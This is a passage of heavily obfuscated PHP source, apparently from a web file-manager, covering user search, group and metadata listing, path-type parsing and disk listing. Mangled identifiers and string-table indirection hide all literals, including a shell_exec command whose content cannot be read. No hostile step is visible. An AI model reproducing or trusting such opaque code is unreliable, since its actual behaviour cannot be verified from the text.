$¹ïÅåü–[443], $¹ïÅåü–[444] => $¹ïÅåü–[445]); $ ë˜ˆê = Input::get($¹ïÅåü–[449], $¹ïÅåü–[7], $¹ïÅåü–[1572], $ÊÜÀß‡¯); $³Ì»§‰Õ = Input::get($¹ïÅåü–[450], $¹ïÅåü–[7], $¹ïÅåü–[1839], array($¹ïÅåü–[1839], $¹ïÅåü–[444])); $³Ì»§‰Õ = $­«šÂÊ[$³Ì»§‰Õ]; $´­Ç­Øú = $´­Ç­Øú . "\165\163\x65\x72\x2e{$ ë˜ˆê}\x20{$³Ì»§‰Õ}\x2c\x20\165\x73\x65\162\x2e\x75\x73\145\x72\111\104\x20\x61\163\x63"; return $this->alias($¹ïÅåü–[1959])->order($´­Ç­Øú); } public function listSearch($§“…Íö½) { $Ğ×âÌ±è =& $_SERVER[¥ÙÌÜ¾ê]; $íŠÍé€¬ = $§“…Íö½[$Ğ×âÌ±è[1840]]; $Úˆ‘Î“ = isset($§“…Íö½[$Ğ×âÌ±è[1841]]) ? $§“…Íö½[$Ğ×âÌ±è[1841]] : !1; $íŠÍé€¬ = str_replace($Ğ×âÌ±è[1842], $Ğ×âÌ±è[1843], trim($íŠÍé€¬)); $úÚÅĞ‡ë = array($Ğ×âÌ±è[28] => array($Ğ×âÌ±è[381], "\45{$íŠÍé€¬}\x25"), $Ğ×âÌ±è[303] => array($Ğ×âÌ±è[381], "{$íŠÍé€¬}\x25"), $Ğ×âÌ±è[2017] => array($Ğ×âÌ±è[381], "{$íŠÍé€¬}\45"), $Ğ×âÌ±è[996] => $Ğ×âÌ±è[1844]); if (Input::check($íŠÍé€¬, $Ğ×âÌ±è[309])) { $úÚÅĞ‡ë[$Ğ×âÌ±è[1581]] = array($Ğ×âÌ±è[381], "{$íŠÍé€¬}\45"); $úÚÅĞ‡ë[$Ğ×âÌ±è[2198]] = array($Ğ×âÌ±è[381], "{$íŠÍé€¬}\45"); } if (!$íŠÍé€¬) { $úÚÅĞ‡ë = array(); } if (isset($§“…Íö½[$Ğ×âÌ±è[743]])) { $úÚÅĞ‡ë[$Ğ×âÌ±è[743]] = $§“…Íö½[$Ğ×âÌ±è[743]]; } $úÚÅĞ‡ë = $this->parseWhereLike($úÚÅĞ‡ë); $Ş„ÍÁºŞ = $this->_makeOrder()->where($úÚÅĞ‡ë)->selectPage(20); if (!$Ş„ÍÁºŞ || count($Ş„ÍÁºŞ[$Ğ×âÌ±è[367]]) < 5 && Input::check($íŠÍé€¬, $Ğ×âÌ±è[316])) { $½Ä¿ö¢ = $this->_searchFromMeta($Ğ×âÌ±è[457], $íŠÍé€¬, 10); $…ıªöºß = $this->_searchFromMeta($Ğ×âÌ±è[458], $íŠÍé€¬, 10); $îç¶©¡£ = array_merge($½Ä¿ö¢, $…ıªöºß, $Ş„ÍÁºŞ[$Ğ×âÌ±è[367]]); $Ş„ÍÁºŞ[$Ğ×âÌ±è[367]] = array_unique_by_key($îç¶©¡£, $Ğ×âÌ±è[1581]); $Ş„ÍÁºŞ[$Ğ×âÌ±è[364]][$Ğ×âÌ±è[365]] = count($Ş„ÍÁºŞ[$Ğ×âÌ±è[367]]); $Ş„ÍÁºŞ[$Ğ×âÌ±è[364]][$Ğ×âÌ±è[366]] = ceil($Ş„ÍÁºŞ[$Ğ×âÌ±è[364]][$Ğ×âÌ±è[365]] / $Ş„ÍÁºŞ[$Ğ×âÌ±è[364]][$Ğ×âÌ±è[361]]); } $this->_listDataApply($Ş„ÍÁºŞ[$Ğ×âÌ±è[367]]); $this->_filterByGroup($Ş„ÍÁºŞ, $Úˆ‘Î“); return $Ş„ÍÁºŞ; } private function _filterByGroup(&$íÇÏ¶³å, $æ‡ŠÒö) { $å„é¢ƒ½ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$æ‡ŠÒö) { return $íÇÏ¶³å; } foreach ($íÇÏ¶³å[$å„é¢ƒ½[367]] as $ŞòÈ¬… => &$¥†ªÛµ–) { $”Éî£Ğ = array_to_keyvalue($¥†ªÛµ–[$å„é¢ƒ½[1929]], $å„é¢ƒ½[33], $å„é¢ƒ½[1749]); if (!in_array($æ‡ŠÒö, $”Éî£Ğ)) { unset($íÇÏ¶³å[$å„é¢ƒ½[367]][$ŞòÈ¬…]); } } unset($¥†ªÛµ–); $íÇÏ¶³å[$å„é¢ƒ½[367]] = array_values($íÇÏ¶³å[$å„é¢ƒ½[367]]); $íÇÏ¶³å[$å„é¢ƒ½[364]] = array($å„é¢ƒ½[1991] => count($íÇÏ¶³å[$å„é¢ƒ½[367]]), $å„é¢ƒ½[1989] => $íÇÏ¶³å[$å„é¢ƒ½[364]][$å„é¢ƒ½[361]], $å„é¢ƒ½[1988] => 1, $å„é¢ƒ½[1990] => 1); } private function _searchFromMeta($•ı°ÆŸÙ, $À¥ÂîÂ¯, $…Ø¡ñêÈ) { $Éü„À ª =& $_SERVER[¥ÙÌÜ¾ê]; $À¥ÂîÂ¯ = strtolower($À¥ÂîÂ¯); $ùã‚Ê² = array($Éü„À ª[93] => $•ı°ÆŸÙ, $Éü„À ª[372] => array($Éü„À ª[381], "\45{$À¥ÂîÂ¯}\x25")); $ùã‚Ê² = $this->parseWhereLike($ùã‚Ê²); $÷çñê©ß = Model($Éü„À ª[2218])->where($ùã‚Ê²)->limit($…Ø¡ñêÈ)->select(); if (!$÷çñê©ß) { return array(); } $÷çñê©ß = array_to_keyvalue($÷çñê©ß, $Éü„À ª[33], $Éü„À ª[1581]); $µ«·£ı = $this->where(array($Éü„À ª[1572] => array($Éü„À ª[7], $÷çñê©ß)))->select(); if (!$µ«·£ı) { return array(); } return $µ«·£ı; } private function _listDataApplyItem($Á…ç±‡…) { $ã†·Èš = array($Á…ç±‡…); $this->_listDataApply($ã†·Èš); return $ã†·Èš[0]; } private function _listDataApply(&$öŸğ²Ç‘) { $ò³—×‰½ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$öŸğ²Ç‘) { return; } array_remove_key($öŸğ²Ç‘, $ò³—×‰½[888]); $™¼³© = array_to_keyvalue($öŸğ²Ç‘, $ò³—×‰½[33], $ò³—×‰½[1581]); $this->_listAppendGroup($öŸğ²Ç‘, $™¼³©); $this->_listAppendMeta($öŸğ²Ç‘, $™¼³©); $this->_listAppendSourceRoot($öŸğ²Ç‘, $™¼³©); } private function _listAppendSourceRoot(&$í‡£Ö¥ë, $¸°œÚĞ¹) { $ç…÷â½ù =& $_SERVER[¥ÙÌÜ¾ê]; $ÉÌÓ±—É = array($ç…÷â½ù[492] => 0, $ç…÷â½ù[498] => array($ç…÷â½ù[7], $¸°œÚĞ¹), $ç…÷â½ù[406] => SourceModel::TYPE_USER); $É†ĞÈÇ = Model($ç…÷â½ù[825])->order($ç…÷â½ù[1850])->field($ç…÷â½ù[1851]); $¤º±©˜í = $É†ĞÈÇ->limit(count($¸°œÚĞ¹))->where($ÉÌÓ±—É)->select(); $¤º±©˜í = array_to_keyvalue($¤º±©˜í, $ç…÷â½ù[498]); $¤º±©˜í = array_remove_key($¤º±©˜í, $ç…÷â½ù[498]); foreach ($í‡£Ö¥ë as &$Û™äÈß“) { $Û™äÈß“[$ç…÷â½ù[85]] = $¤º±©˜í[$Û™äÈß“[$ç…÷â½ù[1581]]] ? $¤º±©˜í[$Û™äÈß“[$ç…÷â½ù[1581]]] : array(); } unset($Û™äÈß“); } private function _listAppendGroup(&$Í¶’üÔ×, $ë†¢©Á—) { $¿ô§†ş« =& $_SERVER[¥ÙÌÜ¾ê]; $ÎµÇçŒ™ = array($¿ô§†ş«[1581] => array($¿ô§†ş«[7], $ë†¢©Á—)); $š¨ë”ÊÎ = Model($¿ô§†ş«[1838])->where($ÎµÇçŒ™)->select(); $ö¬Æ•·ş = array_to_keyvalue($š¨ë”ÊÎ, $¿ô§†ş«[33], $¿ô§†ş«[1749]); $ö¬Æ•·ş = array_remove_value(array_unique($ö¬Æ•·ş), $¿ô§†ş«[191]); if (!$ö¬Æ•·ş || !$š¨ë”ÊÎ) { return; } $ÎµÇçŒ™ = array($¿ô§†ş«[1749] => array($¿ô§†ş«[7], $ö¬Æ•·ş)); $¨ıñİ÷ú = Model($¿ô§†ş«[1927])->field($¿ô§†ş«[2219])->where($ÎµÇçŒ™)->select(); $¨ıñİ÷ú = array_to_keyvalue($¨ıñİ÷ú, $¿ô§†ş«[1749]); $š¨ë”ÊÎ = array_to_keyvalue_group($š¨ë”ÊÎ, $¿ô§†ş«[1581]); foreach ($š¨ë”ÊÎ as &$†ÏÈé¥›) { $¤Ğ¤¿Ê„ = array(); foreach ($†ÏÈé¥› as $Âœó¢) { if (!$Âœó¢[$¿ô§†ş«[1852]]) { continue; } $‰äÜ„Âå = Model($¿ô§†ş«[501])->listData($Âœó¢[$¿ô§†ş«[1852]]); $¤Ğ¤¿Ê„[] = array($¿ô§†ş«[1749] => $Âœó¢[$¿ô§†ş«[1749]], $¿ô§†ş«[2220] => $¨ıñİ÷ú[$Âœó¢[$¿ô§†ş«[1749]]][$¿ô§†ş«[28]], $¿ô§†ş«[515] => $¨ıñİ÷ú[$Âœó¢[$¿ô§†ş«[1749]]][$¿ô§†ş«[515]], $¿ô§†ş«[408] => $‰äÜ„Âå); } $†ÏÈé¥› = $¤Ğ¤¿Ê„; } unset($†ÏÈé¥›); foreach ($Í¶’üÔ× as &$ÂÜ€•ƒ) { $ÂÜ€•ƒ[$¿ô§†ş«[1929]] = array(); if (isset($š¨ë”ÊÎ[$ÂÜ€•ƒ[$¿ô§†ş«[1581]]])) { $ÂÜ€•ƒ[$¿ô§†ş«[1929]] = $š¨ë”ÊÎ[$ÂÜ€•ƒ[$¿ô§†ş«[1581]]]; } } unset($ÂÜ€•ƒ); } public function userAppendGroup($‘ÒÚÁï) { $šÌüú¥ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$‘ÒÚÁï) { return array(); } $this->_listAppendGroup($‘ÒÚÁï, array_to_keyvalue($‘ÒÚÁï, $šÌüú¥[33], $šÌüú¥[1581])); return $‘ÒÚÁï; } private function _listAppendMeta(&$ø±ëŞ½ˆ, $â¦ÀŸè) { $£†óŠÑ¡ =& $_SERVER[¥ÙÌÜ¾ê]; $»˜Šñ = UserJobModel::JOB_KEY; $â¶³¡Ä— = array($£†óŠÑ¡[2199]); $Ë®éµ = array($£†óŠÑ¡[1581] => array($£†óŠÑ¡[7], $â¦ÀŸè)); $Ëê€ñ¾¸ = Model($£†óŠÑ¡[2197])->where($Ë®éµ)->select(); $Ëê€ñ¾¸ = array_to_keyvalue_group($Ëê€ñ¾¸, $£†óŠÑ¡[1581]); foreach ($Ëê€ñ¾¸ as &$ıñÆ‡ñ¥) { $ß×¤ÍãË = array(); foreach ($ıñÆ‡ñ¥ as $£‘…åˆÆ) { if (!in_array($£‘…åˆÆ[$£†óŠÑ¡[93]], $â¶³¡Ä—)) { $ß×¤ÍãË[$£‘…åˆÆ[$£†óŠÑ¡[93]]] = $£‘…åˆÆ[$£†óŠÑ¡[372]]; } } $ıñÆ‡ñ¥ = $ß×¤ÍãË; } unset($ıñÆ‡ñ¥); $î¥„¯…È = Model($£†óŠÑ¡[2221]); foreach ($ø±ëŞ½ˆ as &$Ÿ—â¾ˆ›) { $˜›áÖÆü = array(); if (isset($Ëê€ñ¾¸[$Ÿ—â¾ˆ›[$£†óŠÑ¡[1581]]])) { $˜›áÖÆü = $Ëê€ñ¾¸[$Ÿ—â¾ˆ›[$£†óŠÑ¡[1581]]]; } $Ÿ—â¾ˆ›[$£†óŠÑ¡[2222]] = array(); if (isset($˜›áÖÆü[$»˜Šñ])) { $Ÿ—â¾ˆ›[$£†óŠÑ¡[2222]] = $î¥„¯…È->getUserJobInfo($˜›áÖÆü[$»˜Šñ]); } } unset($Ÿ—â¾ˆ›); } protected function groupUserAll($„Ñ»œ§ö) { $Ÿ€±º¬š =& $_SERVER[¥ÙÌÜ¾ê]; if (!$„Ñ»œ§ö) { return !1; } $üŞÖÕ¸š = Model($Ÿ€±º¬š[1838])->field($Ÿ€±º¬š[1581])->where(array($Ÿ€±º¬š[1749] => array($Ÿ€±º¬š[7], $„Ñ»œ§ö)))->select(); $üŞÖÕ¸š = array_to_keyvalue($üŞÖÕ¸š, $Ÿ€±º¬š[33], $Ÿ€±º¬š[1581]); return array_unique($üŞÖÕ¸š); } public function userSearch($¦°ã”Œ…, $ÎŒ¦¬ “ = "\x2a") { return Model($_SERVER[¥ÙÌÜ¾ê][532])->where($¦°ã”Œ…)->field($ÎŒ¦¬ “)->find(); } } goto bŒŒÌšõ; A¯‰¬åµ÷: class KodIO { const KOD_SOURCE = "\173\x73\x6f\165\x72\143\145\x7d"; const KOD_USER_RECYCLE = "\173\x75\x73\x65\162\122\x65\143\171\x63\x6c\x65\175"; const KOD_USER_FAV = "\x7b\x75\x73\145\162\x46\141\x76\x7d"; const KOD_USER_FILE_TAG = "\173\x75\x73\x65\162\x46\x69\x6c\x65\x54\141\147\175"; const KOD_USER_FILE_TYPE = "\173\x75\x73\145\x72\x46\x69\x6c\145\124\x79\160\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\173\x67\x72\157\165\x70\122\x6f\x6f\x74\x53\145\154\146\x7d"; const KOD_USER_SHARE = "\x7b\x75\163\145\x72\x53\x68\141\x72\145\x7d"; const KOD_USER_SHARE_LINK = "\173\x75\163\145\162\123\150\141\x72\x65\114\x69\x6e\153\175"; const KOD_USER_SHARE_TO_ME = "\173\x73\150\x61\162\145\124\x6f\115\145\x7d"; const KOD_SHARE_ITEM = "\x7b\163\150\x61\x72\x65\111\164\x65\x6d\x7d"; const KOD_SHARE_LINK = "\x7b\163\150\x61\x72\x65\x49\x74\145\x6d\x4c\x69\x6e\x6b\175"; const KOD_SEARCH = "\x7b\163\x65\141\x72\x63\150\175"; const KOD_BLOCK = "\x7b\x62\154\157\143\153\x7d"; const KOD_IO = "\x7b\x69\157\x7d"; const KOD_USER_RECENT = "\173\165\163\145\x72\122\x65\156\143\x65\x6e\164\x7d"; const KOD_USER_DRIVER = "\x7b\144\162\x69\166\x65\162\175"; public static function typeList() { $˜ìšŞ£‹ =& $_SERVER[¥ÙÌÜ¾ê]; return array($˜ìšŞ£‹[1174] => self::KOD_SOURCE, $˜ìšŞ£‹[1175] => self::KOD_USER_RECYCLE, $˜ìšŞ£‹[1176] => self::KOD_USER_FAV, $˜ìšŞ£‹[1177] => self::KOD_USER_FILE_TAG, $˜ìšŞ£‹[1178] => self::KOD_USER_FILE_TYPE, $˜ìšŞ£‹[1179] => self::KOD_GROUP_ROOT_SELF, $˜ìšŞ£‹[1180] => self::KOD_USER_SHARE, $˜ìšŞ£‹[1181] => self::KOD_USER_SHARE_LINK, $˜ìšŞ£‹[1182] => self::KOD_USER_SHARE_TO_ME, $˜ìšŞ£‹[1183] => self::KOD_SHARE_ITEM, $˜ìšŞ£‹[1184] => self::KOD_SHARE_LINK, $˜ìšŞ£‹[1185] => self::KOD_SEARCH, $˜ìšŞ£‹[1186] => self::KOD_BLOCK, $˜ìšŞ£‹[1187] => self::KOD_IO, $˜ìšŞ£‹[1188] => self::KOD_USER_RECENT, $˜ìšŞ£‹[1189] => self::KOD_USER_DRIVER); } public static function parse($³ÇÈ›­) { $®Ş™£çÜ =& $_SERVER[¥ÙÌÜ¾ê]; $³ÇÈ›­ = self::clear($³ÇÈ›­); $‘§ÁôºÆ = array_values(self::typeList()); preg_match($®Ş™£çÜ[1190], $³ÇÈ›­, $©¹è¼¯ú); $Ù ººÛ = array($®Ş™£çÜ[417] => !1, $®Ş™£çÜ[1191] => !1, $®Ş™£çÜ[414] => !1, $®Ş™£çÜ[76] => $³ÇÈ›­, $®Ş™£çÜ[1100] => !1, $®Ş™£çÜ[1099] => $®Ş™£çÜ[33]); if (is_array($©¹è¼¯ú) && count($©¹è¼¯ú) == 5) { $´Õ¡ªÑÓ = $®Ş™£çÜ[1192] . $©¹è¼¯ú[2] . $®Ş™£çÜ[325]; if (in_array($´Õ¡ªÑÓ, $‘§ÁôºÆ)) { $Ù ººÛ[$®Ş™£çÜ[1100]] = $©¹è¼¯ú[1]; $Ù ººÛ[$®Ş™£çÜ[29]] = $´Õ¡ªÑÓ; $Ù ººÛ[$®Ş™£çÜ[1193]] = substr($´Õ¡ªÑÓ, 1, -1); $Ù ººÛ[$®Ş™£çÜ[395]] = $©¹è¼¯ú[3]; } $Ù ººÛ[$®Ş™£çÜ[1099]] = $©¹è¼¯ú[4]; } $îªÍçÄ§ = array($®Ş™£çÜ[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $Ù ººÛ[$®Ş™£çÜ[1155]] = in_array($Ù ººÛ[$®Ş™£çÜ[29]], $îªÍçÄ§); return $Ù ººÛ; } public static function isTruePath($´±ÌéÑ) { $ÉÇ³ˆÉ =& $_SERVER[¥ÙÌÜ¾ê]; if (substr($´±ÌéÑ, 0, 1) != $ÉÇ³ˆÉ[1192]) { return !0; } if (strpos($´±ÌéÑ, $ÉÇ³ˆÉ[403]) === 0) { return !0; } if (strpos($´±ÌéÑ, $ÉÇ³ˆÉ[1159]) === 0) { return !0; } if (strpos($´±ÌéÑ, $ÉÇ³ˆÉ[1194]) === 0) { return !0; } if (strpos($´±ÌéÑ, $ÉÇ³ˆÉ[1195]) === 0) { return !0; } if (strpos($´±ÌéÑ, $ÉÇ³ˆÉ[1196]) === 0) { return !0; } return !1; } public static function clear($Æ–³ôÏ) { $ÃŞª®·ì =& $_SERVER[¥ÙÌÜ¾ê]; $Æ–³ôÏ = str_replace(array($ÃŞª®·ì[1073], $ÃŞª®·ì[229]), $ÃŞª®·ì[50], $Æ–³ôÏ); $Æ–³ôÏ = str_replace($ÃŞª®·ì[97], $ÃŞª®·ì[8], $Æ–³ôÏ); $±”ÜéÅ½ = $ÃŞª®·ì[1197]; if (substr($Æ–³ôÏ, 0, 3) == $ÃŞª®·ì[1198]) { $Æ–³ôÏ = substr($Æ–³ôÏ, 3); } while (strstr($Æ–³ôÏ, $±”ÜéÅ½)) { $Æ–³ôÏ = str_replace($±”ÜéÅ½, $ÃŞª®·ì[8], $Æ–³ôÏ); } $Æ–³ôÏ = preg_replace($ÃŞª®·ì[1199], $ÃŞª®·ì[8], $Æ–³ôÏ); if ($Æ–³ôÏ == $ÃŞª®·ì[8]) { return $ÃŞª®·ì[8]; } $Æ–³ôÏ = rtrim($Æ–³ôÏ, $ÃŞª®·ì[8]); return $Æ–³ôÏ; } public static function sourceID($ÉÔüŞ) { $úÇÕÇ´ =& $_SERVER[¥ÙÌÜ¾ê]; $·èáÚáà = self::parse($ÉÔüŞ); if ($·èáÚáà[$úÇÕÇ´[29]] !== self::KOD_SOURCE) { show_json(LNG($úÇÕÇ´[1200]), !1); } return $·èáÚáà[$úÇÕÇ´[395]]; } public static function make($æÀ©ûó´) { if (!$æÀ©ûó´) { return !1; } return self::makePath(self::KOD_SOURCE, intval($æÀ©ûó´)); } public static function makeShare($ÑŠúÄ¾ş, $²ÙŸÆŞè) { return self::makePath(self::KOD_SHARE_ITEM, $ÑŠúÄ¾ş, $²ÙŸÆŞè); } public static function makeFileTypePath($Ä÷£Ë¸‚) { return self::makePath(self::KOD_USER_FILE_TYPE, $Ä÷£Ë¸‚); } public static function makeFileTagPath($â±¡šª) { return self::makePath(self::KOD_USER_FILE_TAG, $â±¡šª); } public static function makePath($ÃÄ¾ƒõĞ, $ïÂ—çèµ = '', $èŞíÅ˜ = '') { $›şóÂ†³ =& $_SERVER[¥ÙÌÜ¾ê]; $ÔğÇÄ€ë = substr($ÃÄ¾ƒõĞ, 1, -1); $„ì–Ø½Õ = $›şóÂ†³[1201] . $ÔğÇÄ€ë . $›şóÂ†³[1202] . $ïÂ—çèµ . $›şóÂ†³[1203]; $„ì–Ø½Õ = $èŞíÅ˜ ? $„ì–Ø½Õ . $èŞíÅ˜ . $›şóÂ†³[8] : $„ì–Ø½Õ; return $„ì–Ø½Õ; } public static function hashPath($Ãåƒœª˜, $™çÃ–Î = true) { $ã…Ã‘¶‘ =& $_SERVER[¥ÙÌÜ¾ê]; $¥”ïÑªŞ = is_array($Ãåƒœª˜) ? $Ãåƒœª˜ : IO::info($Ãåƒœª˜); $ï şİóı = _get($¥”ïÑªŞ, $ã…Ã‘¶‘[1204], $ã…Ã‘¶‘[33]); if (!$ï şİóı && isset($¥”ïÑªŞ[$ã…Ã‘¶‘[397]])) { $¥”ïÑªŞ = IO::info(KodIO::make($¥”ïÑªŞ[$ã…Ã‘¶‘[397]])); $ï şİóı = _get($¥”ïÑªŞ, $ã…Ã‘¶‘[1204], $ã…Ã‘¶‘[33]); } if (!$ï şİóı && $™çÃ–Î) { $ŠœçÛ¾ˆ = KodIO::parse($¥”ïÑªŞ[$ã…Ã‘¶‘[76]]); if (!$ŠœçÛ¾ˆ[$ã…Ã‘¶‘[29]]) { $ï şİóı = IO::hashSimple($¥”ïÑªŞ[$ã…Ã‘¶‘[76]]); } } if (!$ï şİóı) { $ï şİóı = md5($¥”ïÑªŞ[$ã…Ã‘¶‘[76]] . $¥”ïÑªŞ[$ã…Ã‘¶‘[78]] . $¥”ïÑªŞ[$ã…Ã‘¶‘[84]]); } return $ï şİóı; } public static function initSystemPath() { $Öá…•ıÃ =& $_SERVER[¥ÙÌÜ¾ê]; if (defined($Öá…•ıÃ[1205])) { return; } define($Öá…•ıÃ[1205], self::systemPath($Öá…•ıÃ[1206])); define($Öá…•ıÃ[1207], self::systemPath($Öá…•ıÃ[1208])); define($Öá…•ıÃ[1209], self::systemPath($Öá…•ıÃ[1210])); define($Öá…•ıÃ[1211], self::systemPath($Öá…•ıÃ[1212])); IOHistory::bindEvent(); } public static function systemPath($ë‰–…½) { $ë‚šîµ‘ =& $_SERVER[¥ÙÌÜ¾ê]; $­¤¿ş÷Ò = $ë‚šîµ‘[1213] . ucfirst($ë‰–…½); $ÚµÉşÎ´ = Model($ë‚šîµ‘[763])->get($­¤¿ş÷Ò); if ($ÚµÉşÎ´) { return $ÚµÉşÎ´; } if ($ë‰–…½ == $ë‚šîµ‘[1206]) { $ÚµÉşÎ´ = self::make(Model($ë‚šîµ‘[825])->systemRootPathAdd($ë‚šîµ‘[531])); } else { $ÚµÉşÎ´ = self::systemPath($ë‚šîµ‘[1206]); $‰ ‰Éù = self::sourceID($ÚµÉşÎ´); $ÚµÉşÎ´ = self::make(Model($ë‚šîµ‘[825])->mkdir($‰ ‰Éù, $ë‰–…½)); } Model($ë‚šîµ‘[763])->set($­¤¿ş÷Ò, $ÚµÉşÎ´); return $ÚµÉşÎ´; } public static function systemFolder($­¡ê™ı¿) { $ˆ¹ˆËŒú = IO_PATH_SYSTEM_SOURCE . $­¡ê™ı¿; $ˆÚ¤Ö = Cache::get($ˆ¹ˆËŒú); if (!$ˆÚ¤Ö) { $ßåè›• = IO::infoFull($ˆ¹ˆËŒú); if (!$ßåè›•) { $ˆÚ¤Ö = IO::mkdir($ˆ¹ˆËŒú, REPEAT_SKIP); } else { $ˆÚ¤Ö = $ßåè›•[$_SERVER[¥ÙÌÜ¾ê][76]]; } Cache::set($ˆ¹ˆËŒú, $ˆÚ¤Ö, 3600 * 10); } return $ˆÚ¤Ö; } public static function defaultDriver() { return Model($_SERVER[¥ÙÌÜ¾ê][760])->defaultDriver(); } public static function defaultIO() { $ß«½¬‚ =& $_SERVER[¥ÙÌÜ¾ê]; $¿êÒì¨  = self::defaultDriver(); return $ß«½¬‚[1214] . $¿êÒì¨ [$ß«½¬‚[395]] . $ß«½¬‚[1203]; } public static function defaultDriverInit() { static $”üä³˜ï = false; if ($”üä³˜ï) { return $”üä³˜ï; } $”üä³˜ï = IO::init(self::defaultIO()); return $”üä³˜ï; } public static function fileTypeList() { $ª­¯¾˜ó =& $_SERVER[¥ÙÌÜ¾ê]; $¨ˆåŒƒ = $GLOBALS[$ª­¯¾˜ó[6]][$ª­¯¾˜ó[1215]]; foreach ($¨ˆåŒƒ as $€ÓšŠÃ => $È©Àå¦ ) { $ËòáöºŠ = $ª­¯¾˜ó[1216] . $€ÓšŠÃ; $¢ø³ÅÔÆ = LNG($ËòáöºŠ); if ($ËòáöºŠ != $¢ø³ÅÔÆ) { $¨ˆåŒƒ[$€ÓšŠÃ][$ª­¯¾˜ó[28]] = $¢ø³ÅÔÆ; } } return $¨ˆåŒƒ; } public static function diskList($Õ¥ Ÿîß = true) { $‹áÏ·È“ = $_SERVER[¥ÙÌÜ¾ê][1217]; if ($Õ¥ Ÿîß) { $ª§íŒÍı = Cache::get($‹áÏ·È“); if (is_array($ª§íŒÍı)) { return $ª§íŒÍı; } } $ª§íŒÍı = self::diskListGet(); Cache::set($‹áÏ·È“, $ª§íŒÍı, 3600); return $ª§íŒÍı; } public static function diskListGet() { $ã’¯ ô± =& $_SERVER[¥ÙÌÜ¾ê]; $ÚàŒ©– = array(); if ($GLOBALS[$ã’¯ ô±[6]][$ã’¯ ô±[1218]] == $ã’¯ ô±[1219]) { $÷³Ñ±Ó¶ = $ã’¯ ô±[1220]; for ($º•Êƒ¨Ù = 0; $º•Êƒ¨Ù < strlen($÷³Ñ±Ó¶); $º•Êƒ¨Ù++) { $íĞÍ»Î± = $÷³Ñ±Ó¶[$º•Êƒ¨Ù] . $ã’¯ ô±[1221]; if (file_exists($íĞÍ»Î±)) { $ÚàŒ©–[] = $íĞÍ»Î±; } } return $ÚàŒ©–; } if (!function_exists($ã’¯ ô±[98])) { $ÚàŒ©–[] = $ã’¯ ô±[835]; return $ÚàŒ©–; } $ØùÁÑ²à = explode($ã’¯ ô±[229], shell_exec($ã’¯ ô±[1222])); array_shift($ØùÁÑ²à); array_pop($ØùÁÑ²à); $ÊİÉ¡§ = array($ã’¯ ô±[1223], $ã’¯ ô±[1224], $ã’¯ ô±[1225], $ã’¯ ô±[1226]); foreach ($ØùÁÑ²à as $ÕÕÊøÊ) { $»á‡è¿ç = preg_split($ã’¯ ô±[1227], $ÕÕÊøÊ); $íĞÍ»Î± = $»á‡è¿ç[count($»á‡è¿ç) - 1]; if (!strstr($»á‡è¿ç[0], $ã’¯ ô±[1228])) { continue; } if (!$íĞÍ»Î± || in_array($íĞÍ»Î±, $ÊİÉ¡§)) { continue; } $ÚàŒ©–[] = rtrim($íĞÍ»Î±, $ã’¯ ô±[8]) . $ã’¯ ô±[8]; } return $ÚàŒ©–; } public static function isSameDisk($ Ã÷Ôüò, $‘ÍÂ—Óù) { $¦‡õäê =& $_SERVER[¥ÙÌÜ¾ê]; if ($GLOBALS[$¦‡õäê[6]][$¦‡õäê[1218]] == $¦‡õäê[1219]) { return strtolower(substr($ Ã÷Ôüò, 0, 1)) == strtolower(substr($‘ÍÂ—Óù, 0, 1)); } $¹ÈÕæíÂ = self::diskList(); $Öº”÷ç = !1; $¢¾ ÕŞğ = !1; sort($¹ÈÕæíÂ); $¹ÈÕæíÂ = array_reverse($¹ÈÕæíÂ); $ Ã÷Ôüò = rtrim($ Ã÷Ôüò, $¦‡õäê[8]) . $¦‡õäê[8]; $‘ÍÂ—Óù = rtrim($‘ÍÂ—Óù, $¦‡õäê[8]) . $¦‡õäê[8]; foreach ($¹ÈÕæíÂ as $Öñù˜£) { $Ò¨§•£› = strlen($Öñù˜£); if (!$Öº”÷ç && substr($ Ã÷Ôüò, 0, $Ò¨§•£›) == $Öñù˜£) { $Öº”÷ç = $Öñù˜£; } if (!$¢¾ ÕŞğ && substr($‘ÍÂ—Óù, 0, $Ò¨§•£›) == $Öñù˜£) { $¢¾ ÕŞğ = $Öñù˜£; } if ($Öº”÷ç && $¢¾ ÕŞğ) { break; } } return $Öº”÷ç === $¢¾ ÕŞğ; } public static function transferType($Ø…¢õÔó, $æõäÓ¤Æ) { $ê¢ÎÅ™ =& $_SERVER[¥ÙÌÜ¾ê]; $Í¥šìâŒ = self::driverType($Ø…¢õÔó); $Ã½Úæˆà = self::driverType($æõäÓ¤Æ); if ($Í¥šìâŒ[$ê¢ÎÅ™[29]] == $Ã½Úæˆà[$ê¢ÎÅ™[29]] && $Í¥šìâŒ[$ê¢ÎÅ™[1229]] == $Ã½Úæˆà[$ê¢ÎÅ™[1229]]) { return $ê¢ÎÅ™[1230]; } if ($Í¥šìâŒ[$ê¢ÎÅ™[29]] == $ê¢ÎÅ™[872] && $Ã½Úæˆà[$ê¢ÎÅ™[29]] == $ê¢ÎÅ™[106]) { return $ê¢ÎÅ™[1129]; } if ($Í¥šìâŒ[$ê¢ÎÅ™[29]] == $ê¢ÎÅ™[106] && $Ã½Úæˆà[$ê¢ÎÅ™[29]] == $ê¢ÎÅ™[872]) { return $ê¢ÎÅ™[107]; } return $ê¢ÎÅ™[1231]; } public static function driverType($Ò–¢¯µ) { $ïÇê®ìÒ =& $_SERVER[¥ÙÌÜ¾ê]; $ƒ´€›´Ü = str_replace($ïÇê®ìÒ[1232], $ïÇê®ìÒ[33], strtolower($Ò–¢¯µ->getType())); if ($ƒ´€›´Ü == $ïÇê®ìÒ[751] || $ƒ´€›´Ü == $ïÇê®ìÒ[1233] || $ƒ´€›´Ü == $ïÇê®ìÒ[1234]) { $Ò–¢¯µ = self::defaultDriverInit(); } else { if ($ƒ´€›´Ü == $ïÇê®ìÒ[1136] || $ƒ´€›´Ü == $ïÇê®ìÒ[1235]) { $Ò–¢¯µ = IO::init($Ò–¢¯µ->pathParse[$ïÇê®ìÒ[1083]]); } } $Í˜ÉáÉ¶ = $Ò–¢¯µ->path; $ƒ´€›´Ü = str_replace($ïÇê®ìÒ[1232], $ïÇê®ìÒ[33], strtolower($Ò–¢¯µ->getType())); if ($ƒ´€›´Ü == $ïÇê®ìÒ[106]) { return array($ïÇê®ìÒ[29] => $ïÇê®ìÒ[106], $ïÇê®ìÒ[1229] => 